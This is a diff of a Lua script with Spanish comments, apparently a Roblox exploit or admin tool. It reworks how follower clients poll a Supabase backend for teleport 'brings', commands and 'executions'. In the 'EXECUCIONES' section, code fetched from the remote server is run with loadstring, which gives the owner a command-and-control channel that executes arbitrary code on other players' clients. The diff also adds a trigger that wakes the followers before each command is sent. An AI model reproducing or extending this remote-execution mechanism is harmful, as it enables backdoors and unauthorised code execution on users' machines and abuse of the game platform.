@@ -882,41 +882,68 @@ local function SendHeartbeat()
             end
         end)
 
-        -- ✅ BRINGS via Supabase
+-- ✅ BRINGS + COMANDOS + EXECUCIONES — solo cuando hay owner online
+-- ✅ SISTEMA REACTIVO — duerme hasta que el owner envía trigger
+        local pollingFast = false
+        local fastUntil = 0
+
+        -- Loop de trigger: polling lento, solo chequea si hay señal del owner
+        task.spawn(function()
+            while true do
+                task.wait(15) -- chequea cada 15s si hay trigger
+                if not followerState.ownerOnline then
+                    task.wait(15)
+                    continue
+                end
+                local trigger = supaRequest("get_trigger", {
+                    server_id = currentServerId
+                })
+                if trigger and trigger.active then
+                    pollingFast = true
+                    fastUntil = tick() + 30 -- escuchar activamente por 30s
+                end
+            end
+        end)
+
+        -- Loop activo: solo corre cuando hay trigger activo
         task.spawn(function()
             while true do
                 task.wait(1)
-                local result = supaRequest("get_brings", {
+                if not pollingFast then
+                    task.wait(1)
+                    continue
+                end
+                if tick() > fastUntil then
+                    pollingFast = false
+                    continue
+                end
+
+                -- BRINGS
+                local brings = supaRequest("get_brings", {
                     user_id   = myUserId,
                     server_id = currentServerId
                 })
-                if result and result.brings and #result.brings > 0 then
+                if brings and brings.brings and #brings.brings > 0 then
                     local ids = {}
-                    for _, b in ipairs(result.brings) do
+                    for _, b in ipairs(brings.brings) do
                         table.insert(ids, b.id)
-                        local senderIdStr = tostring(b.sender_id)
                         task.spawn(function()
                             for attempt = 1, 3 do
-                                TeleportToPlayer(senderIdStr)
+                                TeleportToPlayer(tostring(b.sender_id))
                                 if attempt < 3 then task.wait(0.15) end
                             end
                         end)
                     end
                     supaRequest("ack_brings", { ids = ids })
                 end
-            end
-        end)
 
-        -- ✅ COMANDOS via Supabase
-        task.spawn(function()
-            while true do
-                task.wait(1)
-                local result = supaRequest("get_commands", {
+                -- COMANDOS
+                local cmds = supaRequest("get_commands", {
                     server_id = currentServerId
                 })
-                if result and result.commands and #result.commands > 0 then
+                if cmds and cmds.commands and #cmds.commands > 0 then
                     local ids = {}
-                    for _, cmd in ipairs(result.commands) do
+                    for _, cmd in ipairs(cmds.commands) do
                         table.insert(ids, cmd.id)
                         ProcessCommand({
                             command      = cmd.command,
@@ -925,21 +952,16 @@ local function SendHeartbeat()
                     end
                     supaRequest("ack_commands", { ids = ids })
                 end
-            end
-        end)
 
-        -- ✅ EXECUCIONES via Supabase
-        task.spawn(function()
-            while true do
-                task.wait(1)
-                local result = supaRequest("get_executions", {
+                -- EXECUCIONES
+                local execs = supaRequest("get_executions", {
                     user_id   = myUserId,
                     username  = LocalPlayer.Name,
                     server_id = currentServerId
                 })
-                if result and result.executions and #result.executions > 0 then
+                if execs and execs.executions and #execs.executions > 0 then
                     local ids = {}
-                    for _, ex in ipairs(result.executions) do
+                    for _, ex in ipairs(execs.executions) do
                         table.insert(ids, ex.id)
                         pcall(function()
                             local func = loadstring(ex.code)
@@ -950,7 +972,6 @@ local function SendHeartbeat()
                 end
             end
         end)
-
     -- ========================================
     -- ✅ SISTEMA ADMINS
     end -- cierra: if not isOwner and not isAdmin
@@ -1778,6 +1799,9 @@ detectBtn.MouseButton1Click:Connect(function()
                     if cmdPrefix == oc then return end
                 end
             end
+            -- ✅ Primero activar a los followers
+            supaRequest("send_trigger", { server_id = currentServerId })
+            -- Luego enviar el comando
             supaRequest("send_command", {
                 sender_id   = myUserId,
                 sender_role = myRole,
@@ -1792,7 +1816,7 @@ detectBtn.MouseButton1Click:Connect(function()
             sendBtn.BackgroundColor3 = originalColor
             sendBtn.Text = "Ejecutar"
         end
-
+        
         sendBtn.MouseButton1Click:Connect(function() SendCommand(commandInput.Text) end)
         commandInput.FocusLost:Connect(function(enter) if enter then SendCommand(commandInput.Text) end end)
 
